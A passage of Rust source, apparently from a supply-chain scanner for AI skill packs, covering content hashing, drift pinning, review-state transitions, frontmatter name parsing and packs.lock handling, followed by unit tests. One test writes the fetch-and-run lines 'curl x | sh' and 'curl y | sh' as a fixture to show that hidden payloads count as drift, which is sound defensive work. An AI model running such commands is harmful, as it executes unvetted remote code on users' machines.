//! Supply-chain state v2 (spec D2.2): `${DATA}/state.json`, one entry per pack keyed by its
//! canonical absolute path, stored authenticated through [`crate::statefile`].
//!
//! An entry's `tree_hash` is the pack's pin: the content it was first recorded at, or last
//! approved at. Drift is any difference from it, which blocks until the user approves the new
//! content. `last_scanned_hash` is the content the stored findings belong to, so an unchanged
//! pack is not re-scanned. [`decide`] is the pure state transition every caller goes through.

use std::collections::BTreeMap;
use std::io::Read;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use walkdir::WalkDir;

use super::grading::{self, Grade};
use crate::datadir::DataDir;
use crate::error::EngineError;
use crate::statefile::{self, Loaded};

/// The state file name.
pub const STATE_FILE: &str = "state.json";
/// Format version written into [`State::version`].
pub const STATE_VERSION: u32 = 2;
/// Findings kept per pack entry (the rest are counted in [`PackEntry::more_findings`]).
pub const MAX_STORED_FINDINGS: usize = 50;
/// Domain separation of [`tree_hash`].
const TREE_DOMAIN: &[u8] = b"safe-ai-skill/tree/v2\0";

/// How a pack is laid out.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum PackKind {
    /// A skill directory under a skills root.
    Skill,
    /// An `ext/<name>` git submodule.
    Ext,
}

impl PackKind {
    /// Label used in reports.
    pub fn label(self) -> &'static str {
        match self {
            PackKind::Skill => "skill",
            PackKind::Ext => "ext",
        }
    }
}

/// Review state of a pack, from least to most restrictive.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum PackStatus {
    /// Nothing above INFO, or approved / trusted by the user.
    Clean,
    /// Warnings only (documentation findings are capped here).
    Warned,
    /// A code/meta HIGH finding nobody reviewed yet: reported, not blocked.
    Unreviewed,
    /// Denied by the gates until the user approves it.
    Blocked,
}

impl PackStatus {
    /// Stable label.
    pub fn label(self) -> &'static str {
        match self {
            PackStatus::Clean => "clean",
            PackStatus::Warned => "warned",
            PackStatus::Unreviewed => "unreviewed",
            PackStatus::Blocked => "blocked",
        }
    }
}

/// Why a pack is in its state.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Reason {
    /// Single findings (HIGH or WARN).
    Heuristic,
    /// A combination rule fired.
    Combo,
    /// The content differs from its pin.
    Drift,
    /// The content differs from the project's committed `packs.lock`.
    LockMismatch,
}

impl Reason {
    /// Stable label.
    pub fn label(self) -> &'static str {
        match self {
            Reason::Heuristic => "heuristic",
            Reason::Combo => "combo",
            Reason::Drift => "drift",
            Reason::LockMismatch => "lock_mismatch",
        }
    }
}

/// Severity of a stored finding: the scanner's severities plus `block` for a combo hit.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum StoredSev {
    /// Inventory.
    Info,
    /// Warning.
    Warn,
    /// Code/meta HIGH.
    High,
    /// A combination rule.
    Block,
}

/// One finding as stored: `{rule, sev, path, line, ctx}` (spec D2.2).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct StoredFinding {
    /// Rule (or combo) id.
    pub rule: String,
    /// Severity.
    pub sev: StoredSev,
    /// Path relative to the pack root (`/`-separated).
    pub path: String,
    /// 1-based line; `0` when not line-addressable.
    #[serde(default)]
    pub line: u32,
    /// `code`, `doc` or `meta`.
    pub ctx: grading::Ctx,
}

impl StoredFinding {
    /// `path:line` (just `path` when the line is unknown).
    pub fn location(&self) -> String {
        if self.line == 0 {
            self.path.clone()
        } else {
            format!("{}:{}", self.path, self.line)
        }
    }
}

/// One pack's entry.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct PackEntry {
    /// Layout.
    pub kind: PackKind,
    /// The pin: recorded on first sight, replaced only by an approval or a v1 re-baseline. A
    /// pin carried over from a v1 lockfile that no longer matches is `v1:<identity>`.
    pub tree_hash: String,
    /// The checked-out commit of an ext submodule, for display.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub head: Option<String>,
    /// Unix seconds when first recorded.
    pub first_seen: u64,
    /// Content the stored findings and grade belong to.
    pub last_scanned_hash: String,
    /// Grade of the last scan.
    pub grade: Grade,
    /// Review state.
    pub state: PackStatus,
    /// Findings of the last scan (WARN and above; combos as `block`), capped.
    #[serde(default)]
    pub findings: Vec<StoredFinding>,
    /// Findings left out by the cap.
    #[serde(default, skip_serializing_if = "is_zero")]
    pub more_findings: usize,
    /// Every combo and HIGH rule of the last scan (what a trust entry must acknowledge).
    #[serde(default)]
    pub flagged_rules: Vec<String>,
    /// Why the pack is not clean.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub reason: Option<Reason>,
    /// Skill names the pack provides (its directory name and each `SKILL.md` name).
    #[serde(default)]
    pub names: Vec<String>,
    /// [`Self::names`] may be incomplete (unparseable frontmatter, an escaping link, or a
    /// name walk that ran out of budget).
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub names_incomplete: bool,
    /// Skill dirs whose `SKILL.md`, or which themselves, link outside the pack.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub escaping: Vec<String>,
    /// The user approved or trusted the pinned content (prompt-nonce confirmed).
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub approved: bool,
    /// Where `supply_chain.on_block: move` put the pack (its key stays the origin path).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub quarantined_to: Option<String>,
    /// A one-off note for the next report (e.g. a v1 re-baseline), cleared once reported.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub note: Option<String>,
}

fn is_zero(n: &usize) -> bool {
    *n == 0
}

/// The `state.json` body.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct State {
    /// [`STATE_VERSION`].
    #[serde(default)]
    pub version: u32,
    /// Packs by canonical absolute path.
    #[serde(default)]
    pub packs: BTreeMap<String, PackEntry>,
    /// v1 lockfile pins already matched to a pack: `skill:<name>` / `ext:<name>` → that
    /// pack's canonical path. A v1 pin is keyed by bare name, so a second pack of the same
    /// name elsewhere is a collision, not drift.
    #[serde(default)]
    pub v1_claims: BTreeMap<String, String>,
}

/// Outcome of [`load`].
#[derive(Debug, Clone, PartialEq)]
pub struct LoadedState {
    /// The state (empty when missing or tampered).
    pub state: State,
    /// The file existed but failed authentication: every pack is seen afresh.
    pub tampered: bool,
}

/// Load `state.json` from `dir`. A tampered file is discarded (reported by the caller).
pub fn load(dir: &DataDir) -> LoadedState {
    match statefile::load::<State>(dir, STATE_FILE) {
        Loaded::Valid(state) => LoadedState {
            state,
            tampered: false,
        },
        // A deleted state file is not a fresh install when the marker says one was written.
        Loaded::Missing => LoadedState {
            state: State::default(),
            tampered: !matches!(
                statefile::load::<StateMarker>(dir, STATE_MARKER),
                Loaded::Missing
            ),
        },
        Loaded::Tampered => LoadedState {
            state: State::default(),
            tampered: true,
        },
    }
}

/// Store `state` (authenticated, atomic), and the marker recording that it exists.
pub fn store(dir: &DataDir, state: &State) -> Result<(), EngineError> {
    let mut state = state.clone();
    state.version = STATE_VERSION;
    statefile::store(dir, STATE_FILE, &state)?;
    if !matches!(
        statefile::load::<StateMarker>(dir, STATE_MARKER),
        Loaded::Valid(_)
    ) {
        statefile::store(dir, STATE_MARKER, &StateMarker { exists: true })?;
    }
    Ok(())
}

/// The MAC'd marker written beside the first `state.json`: a later missing state file with
/// this marker present is reported as tampering, not taken for a fresh install.
pub const STATE_MARKER: &str = "state-exists.json";

/// Body of [`STATE_MARKER`].
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
struct StateMarker {
    exists: bool,
}

/// What a scan of the current content observed.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Observation {
    /// Current [`tree_hash`].
    pub hash: String,
    /// Grade of the current content.
    pub grade: Grade,
    /// Hash the project's `packs.lock` pins this path to, if any.
    pub lock: Option<String>,
    /// The user trusts exactly this content, acknowledging every HIGH and combo rule in it.
    pub trusted: bool,
    /// The project's `packs.lock` pins exactly this content.
    pub lock_matches: bool,
}

/// The result of [`decide`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Transition {
    /// New state.
    pub state: PackStatus,
    /// Why.
    pub reason: Option<Reason>,
    /// The pin to keep.
    pub pin: String,
}

/// The pure state transition (spec D2.4, D2.7, D2.8).
///
/// `pin` is the entry's current pin (`None` on first sight). `floor` raises the state for a v1
/// re-baseline (`Warned`) or a v1 pin recorded with a HIGH scan (`Unreviewed`).
///
/// In order: trusted content is clean and becomes the pin; a combo blocks; content that
/// differs from its pin blocks (drift); content that differs from the committed `packs.lock`
/// blocks; otherwise the grade decides (HIGH → unreviewed, unless `packs.lock` pins this
/// exact content, which counts as reviewed → warned).
pub fn decide(pin: Option<&str>, obs: &Observation, floor: Option<PackStatus>) -> Transition {
    let recorded = pin.unwrap_or(&obs.hash).to_string();
    if obs.trusted {
        return Transition {
            state: PackStatus::Clean,
            reason: None,
            pin: obs.hash.clone(),
        };
    }
    if obs.grade == Grade::Block {
        return blocked(Reason::Combo, recorded);
    }
    if pin.is_some_and(|p| p != obs.hash) {
        return blocked(Reason::Drift, recorded);
    }
    if obs.lock.as_deref().is_some_and(|l| l != obs.hash) {
        return blocked(Reason::LockMismatch, recorded);
    }
    let (state, reason) = match obs.grade {
        Grade::High if obs.lock_matches => (PackStatus::Warned, Some(Reason::Heuristic)),
        Grade::High => (PackStatus::Unreviewed, Some(Reason::Heuristic)),
        Grade::Warn => (PackStatus::Warned, Some(Reason::Heuristic)),
        Grade::Clean | Grade::Block => (PackStatus::Clean, None),
    };
    match floor {
        Some(f) if f > state => Transition {
            state: f,
            reason: reason.or(Some(Reason::Heuristic)),
            pin: recorded,
        },
        _ => Transition {
            state,
            reason,
            pin: recorded,
        },
    }
}

fn blocked(reason: Reason, pin: String) -> Transition {
    Transition {
        state: PackStatus::Blocked,
        reason: Some(reason),
        pin,
    }
}

/// The findings of `report` worth storing (WARN and above, combos as `block`), capped at
/// [`MAX_STORED_FINDINGS`]; returns them and how many were left out.
pub fn stored_findings(report: &grading::PackReport) -> (Vec<StoredFinding>, usize) {
    let mut all: Vec<StoredFinding> = report
        .combos
        .iter()
        .map(|c| StoredFinding {
            rule: c.rule.to_string(),
            sev: StoredSev::Block,
            path: rel_display(&c.path),
            line: c.line.unwrap_or(0),
            ctx: grading::Ctx::Meta,
        })
        .collect();
    let mut singles: Vec<StoredFinding> = report
        .findings
        .iter()
        .filter_map(|f| {
            let sev = match f.effective_sev() {
                grading::Severity::High => StoredSev::High,
                grading::Severity::Warn => StoredSev::Warn,
                grading::Severity::Info => return None,
            };
            Some(StoredFinding {
                rule: f.rule.to_string(),
                sev,
                path: rel_display(&f.path),
                line: f.line.unwrap_or(0),
                ctx: f.ctx,
            })
        })
        .collect();
    // Worst first, keeping walk order within a severity.
    singles.sort_by_key(|f| std::cmp::Reverse(f.sev));
    all.append(&mut singles);
    let more = all.len().saturating_sub(MAX_STORED_FINDINGS);
    all.truncate(MAX_STORED_FINDINGS);
    (all, more)
}

/// The rules a trust entry must acknowledge for `report`: every combo and every HIGH.
pub fn flagged_rules(report: &grading::PackReport) -> Vec<String> {
    let mut rules: Vec<String> = report
        .combos
        .iter()
        .map(|c| c.rule.to_string())
        .chain(
            report
                .findings
                .iter()
                .filter(|f| f.effective_sev() == grading::Severity::High)
                .map(|f| f.rule.to_string()),
        )
        .collect();
    rules.sort();
    rules.dedup();
    rules
}

/// A pack-relative path as stored (`/`-separated).
fn rel_display(path: &Path) -> String {
    path.to_string_lossy().replace('\\', "/")
}

// ---------------------------------------------------------------------------------------
// tree_hash (spec D2.2)
// ---------------------------------------------------------------------------------------

/// The content identity of a pack: SHA-256 over its full entry set, never running git.
///
/// Every non-directory entry below `root` counts, sorted by relative path: a regular file as
/// `(path, 'F', exec bit, sha256(content))`, a symlink as `(path, 'L', target)` (never
/// followed), anything else as `(path, 'O')`, and an unreadable entry as `(path, 'E')`. Only
/// the pack-root `.git` (a checkout's dir or a submodule's gitlink file) is skipped, so a
/// `git fetch` inside a checkout is not drift; a nested `.git` is content like any other.
/// Only the exec bit of the mode counts (as git tracks it), so umask differences between
/// clones and worktrees do not change the hash. A missing `root` hashes to the empty string.
pub fn tree_hash(root: &Path) -> String {
    tree_hash_until(root, None).unwrap_or_default()
}

/// [`tree_hash`], giving up (`None`) once `deadline` passes.
pub fn tree_hash_until(root: &Path, deadline: Option<std::time::Instant>) -> Option<String> {
    let Ok(meta) = root.symlink_metadata() else {
        return Some(String::new());
    };
    let mut entries: Vec<(Vec<u8>, Vec<u8>)> = Vec::new();
    if meta.is_dir() {
        let walker = WalkDir::new(root)
            .follow_links(false)
            .min_depth(1)
            .into_iter()
            .filter_entry(|e| !(e.depth() == 1 && e.file_name() == ".git"));
        for entry in walker {
            if deadline.is_some_and(|d| std::time::Instant::now() >= d) {
                return None;
            }
            match entry {
                Ok(e) if e.file_type().is_dir() => {}
                Ok(e) => {
                    let rel = rel_bytes(e.path().strip_prefix(root).unwrap_or(e.path()));
                    entries.push((rel, entry_record(e.path())));
                }
                Err(err) => {
                    if let Some(path) = err.path() {
                        let rel = rel_bytes(path.strip_prefix(root).unwrap_or(path));
                        entries.push((rel, b"E".to_vec()));
                    }
                }
            }
        }
    } else {
        let name = root
            .file_name()
            .map(|n| rel_bytes(Path::new(n)))
            .unwrap_or_default();
        entries.push((name, entry_record(root)));
    }
    entries.sort();

    let mut hasher = Sha256::new();
    hasher.update(TREE_DOMAIN);
    for (rel, record) in &entries {
        hasher.update((rel.len() as u64).to_le_bytes());
        hasher.update(rel);
        hasher.update((record.len() as u64).to_le_bytes());
        hasher.update(record);
    }
    Some(hex(&hasher.finalize()))
}

/// The record of one non-directory entry (see [`tree_hash`]).
fn entry_record(path: &Path) -> Vec<u8> {
    let Ok(meta) = path.symlink_metadata() else {
        return b"E".to_vec();
    };
    let ft = meta.file_type();
    if ft.is_symlink() {
        return match std::fs::read_link(path) {
            Ok(target) => {
                let mut r = b"L".to_vec();
                r.extend(rel_bytes(&target));
                r
            }
            Err(_) => b"E".to_vec(),
        };
    }
    if !ft.is_file() {
        return b"O".to_vec();
    }
    let mut file = match std::fs::File::open(path) {
        Ok(f) => f,
        Err(_) => return b"E".to_vec(),
    };
    let mut hasher = Sha256::new();
    let mut buf = [0u8; 64 * 1024];
    loop {
        match file.read(&mut buf) {
            Ok(0) => break,
            Ok(n) => hasher.update(&buf[..n]),
            Err(_) => return b"E".to_vec(),
        }
    }
    let mut r = vec![b'F', if is_exec(&meta) { b'x' } else { b'-' }];
    r.extend_from_slice(&hasher.finalize());
    r
}

#[cfg(unix)]
fn is_exec(meta: &std::fs::Metadata) -> bool {
    use std::os::unix::fs::PermissionsExt;
    meta.permissions().mode() & 0o111 != 0
}

#[cfg(not(unix))]
fn is_exec(_meta: &std::fs::Metadata) -> bool {
    false
}

/// Raw path bytes, `/`-separated (lossless on unix).
fn rel_bytes(path: &Path) -> Vec<u8> {
    #[cfg(unix)]
    {
        use std::os::unix::ffi::OsStrExt;
        path.as_os_str().as_bytes().to_vec()
    }
    #[cfg(not(unix))]
    {
        path.to_string_lossy().replace('\\', "/").into_bytes()
    }
}

/// Lowercase hex.
pub(crate) fn hex(bytes: &[u8]) -> String {
    let mut out = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        out.push_str(&format!("{b:02x}"));
    }
    out
}

/// The skill names a pack provides (see [`skill_names_until`]).
pub fn skill_names(root: &Path) -> Vec<String> {
    skill_names_until(root, None).names
}

/// Work units (dirs read and SKILL.md files) the name walk spends per pack before giving up.
pub const MAX_NAME_WALK_ENTRIES: usize = 20_000;

/// What [`skill_names_until`] found.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct SkillNames {
    /// Every name the pack may be invoked by.
    pub names: Vec<String>,
    /// Some names may be missing: a `SKILL.md` whose frontmatter does not parse, or a
    /// `SKILL.md` / skill dir that resolves outside the pack (or not at all).
    pub unparseable: bool,
    /// Names of the skill dirs whose `SKILL.md`, or which themselves, link outside the pack:
    /// their content is never verified, so invoking them is denied.
    pub escaping: Vec<String>,
    /// The walk spent [`MAX_NAME_WALK_ENTRIES`] work units or hit the deadline before finishing.
    pub over_budget: bool,
}

/// The skill names a pack provides: its directory name, and for every entry named `SKILL.md`
/// (any case; not under the pack-root `.git` or a `node_modules`) the name of the dir it sits
/// in, as reached, and every value its frontmatter gives `name`.
///
/// Symlinks are never walked through blindly: a `SKILL.md` link or a dir link is resolved once
/// (the kernel bounds the chain) and followed only when it stays inside the pack; each real dir
/// is visited once however many links lead to it. A link leaving the pack (or dangling) marks
/// the result [`SkillNames::unparseable`] and lists the name in [`SkillNames::escaping`]. There
/// is no depth limit: the walk stops after [`MAX_NAME_WALK_ENTRIES`] work units (dirs read and
/// `SKILL.md` files) or at `deadline`, setting [`SkillNames::over_budget`].
pub fn skill_names_until(root: &Path, deadline: Option<std::time::Instant>) -> SkillNames {
    skill_names_bounded(root, deadline, MAX_NAME_WALK_ENTRIES)
}

/// [`skill_names_until`] with an explicit entry cap.
pub(crate) fn skill_names_bounded(
    root: &Path,
    deadline: Option<std::time::Instant>,
    max_entries: usize,
) -> SkillNames {
    let mut out = SkillNames::default();
    let root_name = root
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or_default()
        .to_string();
    if !root_name.is_empty() {
        out.names.push(root_name.clone());
    }
    let Ok(canonical_root) = root.canonicalize() else {
        return out;
    };
    let mut visited: std::collections::HashSet<PathBuf> = std::collections::HashSet::new();
    visited.insert(canonical_root.clone());
    // (canonical dir, the name it was reached by, depth)
    let mut stack: Vec<(PathBuf, String, usize)> = vec![(canonical_root.clone(), root_name, 0)];
    // Work units: dirs read (including a link target checked for a SKILL.md) and SKILL.md
    // files. Plain files cost no unit, so a large but flat pack stays within budget; the
    // deadline still bounds the time spent listing them.
    let mut units = 0usize;
    let mut skill_md_in: std::collections::HashMap<PathBuf, bool> =
        std::collections::HashMap::new();
    let charge = |out: &mut SkillNames, units: &mut usize| -> bool {
        *units += 1;
        if *units > max_entries {
            out.over_budget = true;
            out.unparseable = true;
        }
        out.over_budget
    };
    while let Some((dir, reached_as, depth)) = stack.pop() {
        if charge(&mut out, &mut units) {
            return finish(out);
        }
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for entry in entries.flatten() {
            if deadline.is_some_and(|d| std::time::Instant::now() >= d) {
                out.over_budget = true;
                out.unparseable = true;
                return finish(out);
            }
            let name = entry.file_name();
            let Some(name) = name.to_str().map(String::from) else {
                continue;
            };
            if (depth == 0 && name == ".git") || name == "node_modules" {
                continue;
            }
            let Ok(ft) = entry.file_type() else { continue };
            let path = dir.join(&name);
            if name.eq_ignore_ascii_case("SKILL.md") {
                if charge(&mut out, &mut units) {
                    return finish(out);
                }
                // The dir it sits in is a skill name whatever the file resolves to.
                out.names.push(reached_as.clone());
                let target = if ft.is_symlink() {
                    path.canonicalize()
                        .ok()
                        .filter(|t| t.starts_with(&canonical_root))
                } else {
                    Some(path.clone())
                };
                match target.filter(|t| t.is_file()) {
                    Some(t) => {
                        let (names, parsed) = frontmatter_names(&t);
                        out.names.extend(names);
                        out.unparseable |= !parsed;
                    }
                    None => {
                        out.unparseable = true;
                        out.escaping.push(reached_as.clone());
                    }
                }
                continue;
            }
            if ft.is_dir() {
                if visited.insert(path.clone()) {
                    stack.push((path, name, depth + 1));
                }
            } else if ft.is_symlink() {
                match path.canonicalize() {
                    Ok(t) if t.is_dir() && t.starts_with(&canonical_root) => {
                        // A linked skill dir is invoked by the link's name. Each target is
                        // listed once, however many links lead to it.
                        let has = match skill_md_in.get(&t) {
                            Some(h) => *h,
                            None => {
                                if charge(&mut out, &mut units) {
                                    return finish(out);
                                }
                                let h = has_skill_md(&t);
                                skill_md_in.insert(t.clone(), h);
                                h
                            }
                        };
                        if has {
                            out.names.push(name.clone());
                        }
                        if visited.insert(t.clone()) {
                            stack.push((t, name, depth + 1));
                        }
                    }
                    Ok(t) if !t.is_dir() => {}
                    // A dir link leaving the pack, or one that does not resolve.
                    _ => {
                        out.unparseable = true;
                        out.escaping.push(name);
                    }
                }
            }
        }
    }
    finish(out)
}

fn finish(mut out: SkillNames) -> SkillNames {
    for list in [&mut out.names, &mut out.escaping] {
        list.retain(|n| !n.is_empty());
        list.sort();
        list.dedup();
    }
    out
}

/// True when `dir` holds an entry named `SKILL.md` (any case).
fn has_skill_md(dir: &Path) -> bool {
    std::fs::read_dir(dir).is_ok_and(|entries| {
        entries.flatten().take(MAX_NAME_WALK_ENTRIES).any(|e| {
            e.file_name()
                .to_str()
                .is_some_and(|n| n.eq_ignore_ascii_case("SKILL.md"))
        })
    })
}

/// Every `name` a `SKILL.md` frontmatter gives, from its first 64 KiB: the YAML value (a
/// leading BOM stripped), plus every line that sets a `name` key however it is spelled
/// (`name:`, `name :`, `"name":`, `'name':`), so duplicate keys yield all their values. The
/// flag is false when frontmatter is opened but does not parse as YAML (duplicate keys
/// included), or the file cannot be read: its names may then be incomplete.
fn frontmatter_names(path: &Path) -> (Vec<String>, bool) {
    let mut head = Vec::new();
    let read = std::fs::File::open(path)
        .and_then(|f| f.take(64 * 1024).read_to_end(&mut head))
        .is_ok();
    if !read {
        return (Vec::new(), false);
    }
    let text = String::from_utf8_lossy(&head);
    let text = text.trim_start_matches('\u{feff}');
    let mut lines = text.lines();
    if lines.next().map(str::trim) != Some("---") {
        return (Vec::new(), true);
    }
    let mut block: Vec<&str> = Vec::new();
    let mut closed = false;
    for line in lines {
        if matches!(line.trim_end(), "---" | "...") {
            closed = true;
            break;
        }
        block.push(line);
    }
    let mut names: Vec<String> = block
        .iter()
        .filter_map(|line| name_line_value(line))
        .collect();
    let parsed = closed
        && match serde_yaml::from_str::<serde_yaml::Value>(&block.join("\n")) {
            Ok(serde_yaml::Value::Mapping(map)) => {
                if let Some(name) = map
                    .get(serde_yaml::Value::String("name".into()))
                    .and_then(yaml_scalar)
                {
                    names.push(name);
                }
                true
            }
            Ok(serde_yaml::Value::Null) => true,
            _ => false,
        };
    names.retain(|n| !n.is_empty());
    (names, parsed)
}

/// The value of a top-level `name` key on one frontmatter line, however the key is quoted.
fn name_line_value(line: &str) -> Option<String> {
    if line.starts_with([' ', '\t']) {
        return None;
    }
    let (key, value) = line.split_once(':')?;
    let key = key
        .trim_start_matches('\u{feff}')
        .trim()
        .trim_matches(|c| c == '"' || c == '\'');
    if key != "name" {
        return None;
    }
    let mut value = value.split(" #").next().unwrap_or("").trim();
    // A YAML tag (`!custom bar`) does not change the scalar.
    if value.starts_with('!') {
        value = value
            .split_once(char::is_whitespace)
            .map_or("", |x| x.1)
            .trim();
    }
    let value = value
        .trim_matches(|c| c == '"' || c == '\'')
        .trim_start_matches('\u{feff}')
        .trim();
    (!value.is_empty()).then(|| value.to_string())
}

/// A YAML scalar as a string.
fn yaml_scalar(v: &serde_yaml::Value) -> Option<String> {
    match v {
        serde_yaml::Value::String(s) => Some(s.trim_start_matches('\u{feff}').trim().to_string()),
        // `name: !custom bar` is still `bar` to anything reading the scalar.
        serde_yaml::Value::Tagged(t) => yaml_scalar(&t.value),
        serde_yaml::Value::Number(n) => Some(n.to_string()),
        serde_yaml::Value::Bool(b) => Some(b.to_string()),
        _ => None,
    }
}

// ---------------------------------------------------------------------------------------
// packs.lock (spec D2.7)
// ---------------------------------------------------------------------------------------

/// Project-relative location of the committed pack lock.
pub const PACKS_LOCK: &str = ".safe-ai-skill/packs.lock";

/// One `packs.lock` pin.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
struct LockPin {
    path: String,
    tree_hash: String,
}

/// The `packs.lock` body: `{"packs": [{"path": "<project-relative>", "tree_hash": "…"}]}`.
#[derive(Debug, Clone, Default, Deserialize)]
struct PacksLockFile {
    #[serde(default)]
    packs: Vec<LockPin>,
}

/// Pins from a project's committed `packs.lock`, by canonical absolute path.
///
/// The file can only add pins: an entry constrains its pack to one content (a mismatch is
/// `lock_mismatch` BLOCK), and nothing in it can unblock, unpin or trust anything. Entries
/// whose path leaves the project are ignored, as is an unreadable or malformed file.
pub fn packs_lock(project_dir: &Path) -> BTreeMap<String, String> {
    let mut pins = BTreeMap::new();
    let Ok(text) = std::fs::read_to_string(project_dir.join(PACKS_LOCK)) else {
        return pins;
    };
    let Ok(file) = serde_json::from_str::<PacksLockFile>(&text) else {
        return pins;
    };
    let Ok(project) = project_dir.canonicalize() else {
        return pins;
    };
    for pin in file.packs {
        let rel = Path::new(&pin.path);
        if rel.is_absolute() || pin.tree_hash.is_empty() {
            continue;
        }
        let Ok(abs) = project.join(rel).canonicalize() else {
            continue;
        };
        if abs.starts_with(&project) && abs != project {
            pins.insert(key_of(&abs), pin.tree_hash);
        }
    }
    pins
}

/// The state key of a canonical path.
pub fn key_of(canonical: &Path) -> String {
    canonical.to_string_lossy().into_owned()
}

/// The canonical path of a state key.
pub fn path_of(key: &str) -> PathBuf {
    PathBuf::from(key)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    fn tmp(tag: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!(
            "ssai-state-{tag}-{}-{:?}",
            std::process::id(),
            std::thread::current().id()
        ));
        let _ = fs::remove_dir_all(&d);
        fs::create_dir_all(&d).unwrap();
        d
    }

    fn obs(hash: &str, grade: Grade) -> Observation {
        Observation {
            hash: hash.into(),
            grade,
            lock: None,
            trusted: false,
            lock_matches: false,
        }
    }

    #[cfg(unix)]
    #[test]
    fn symlink_retarget_is_drift() {
        let d = tmp("symlink");
        fs::write(d.join("a"), "a").unwrap();
        fs::write(d.join("b"), "b").unwrap();
        std::os::unix::fs::symlink("a", d.join("link")).unwrap();
        let before = tree_hash(&d);
        fs::remove_file(d.join("link")).unwrap();
        std::os::unix::fs::symlink("b", d.join("link")).unwrap();
        assert_ne!(before, tree_hash(&d));
    }

    #[cfg(unix)]
    #[test]
    fn exec_bit_is_drift_but_other_mode_bits_are_not() {
        use std::os::unix::fs::PermissionsExt;
        let d = tmp("mode");
        fs::write(d.join("run.sh"), "echo hi").unwrap();
        fs::set_permissions(d.join("run.sh"), fs::Permissions::from_mode(0o644)).unwrap();
        let before = tree_hash(&d);
        fs::set_permissions(d.join("run.sh"), fs::Permissions::from_mode(0o664)).unwrap();
        assert_eq!(before, tree_hash(&d), "group-write (umask) is not content");
        fs::set_permissions(d.join("run.sh"), fs::Permissions::from_mode(0o755)).unwrap();
        assert_ne!(before, tree_hash(&d), "chmod +x is drift");
    }

    #[test]
    fn only_the_pack_root_git_is_skipped() {
        let d = tmp("nested-git");
        fs::write(d.join("SKILL.md"), "# s").unwrap();
        // A submodule checkout's gitlink file at the root.
        fs::write(d.join(".git"), "gitdir: ../../.git/modules/x").unwrap();
        let before = tree_hash(&d);
        fs::write(d.join(".git"), "gitdir: elsewhere").unwrap();
        assert_eq!(before, tree_hash(&d));
        // A nested `.git` is content: a payload hidden there is drift.
        fs::create_dir_all(d.join("lib/.git")).unwrap();
        fs::write(d.join("lib/.git/payload.sh"), "curl x | sh").unwrap();
        let with_nested = tree_hash(&d);
        assert_ne!(before, with_nested);
        fs::write(d.join("lib/.git/payload.sh"), "curl y | sh").unwrap();
        assert_ne!(with_nested, tree_hash(&d));
    }

    #[test]
    fn frontmatter_names_cover_spellings_duplicates_and_parse_failures() {
        let d = tmp("fm");
        let names = |body: &str| {
            fs::write(d.join("SKILL.md"), body).unwrap();
            frontmatter_names(&d.join("SKILL.md"))
        };
        assert_eq!(
            names("---\n\"name\": bar\n---\n"),
            (vec!["bar".into(), "bar".into()], true)
        );
        assert_eq!(names("---\nname : bar\n---\n").0[0], "bar");
        assert_eq!(names("\u{feff}---\nname: bar\n---\n").0[0], "bar");
        let (dup, parsed) = names("---\nname: a\nname: b\n---\n");
        assert!(dup.contains(&"a".to_string()) && dup.contains(&"b".to_string()));
        assert!(!parsed, "duplicate keys do not parse");
        assert!(!names("---\nname: [unclosed\n---\n").1);
        assert!(!names("---\nname: open-ended\n").1, "an unclosed fence");
        assert_eq!(names("# no frontmatter\nname: nope\n"), (vec![], true));
        // A uniformly indented block is still a top-level mapping to YAML.
        assert_eq!(
            names("---\n  name: nested\n---\n").0,
            vec!["nested".to_string()]
        );
    }

    /// `levels` dirs `d1..`, each holding `fan` links to the next; the root holds `fan` links
    /// to `d1`; the last dir holds the SKILL.md. Walked blindly that is fan^levels paths.
    #[cfg(unix)]
    fn fan_out(root: &Path, levels: usize, fan: usize) {
        for l in 1..=levels {
            fs::create_dir_all(root.join(format!("d{l}"))).unwrap();
        }
        for i in 1..=fan {
            std::os::unix::fs::symlink("d1", root.join(format!("l{i}"))).unwrap();
            for l in 1..levels {
                std::os::unix::fs::symlink(
                    format!("../d{}", l + 1),
                    root.join(format!("d{l}/l{i}")),
                )
                .unwrap();
            }
        }
        fs::write(
            root.join(format!("d{levels}/SKILL.md")),
            "---\nname: deep\n---\n",
        )
        .unwrap();
    }

    #[cfg(unix)]
    #[test]
    fn a_symlink_fan_out_is_walked_once_per_real_dir() {
        let d = tmp("fanout").join("pack");
        fan_out(&d, 12, 8);
        let started = std::time::Instant::now();
        let names = skill_names_until(&d, None);
        assert!(
            started.elapsed() < std::time::Duration::from_secs(2),
            "{:?}",
            started.elapsed()
        );
        assert!(!names.over_budget && !names.unparseable, "{names:?}");
        assert!(names.names.contains(&"deep".to_string()), "{names:?}");
        // Hashing never follows links either.
        let started = std::time::Instant::now();
        tree_hash(&d);
        assert!(started.elapsed() < std::time::Duration::from_secs(2));
    }

    #[test]
